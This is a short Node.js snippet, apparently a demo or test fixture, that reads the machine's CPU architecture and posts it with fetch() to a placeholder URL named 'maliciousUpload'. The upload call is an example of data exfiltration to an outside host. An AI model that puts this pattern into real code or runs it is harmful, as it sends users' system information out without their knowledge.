const os = require('os')

const arch = os.arch()
console.log('Arch:', arch)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { arch }
  }
)
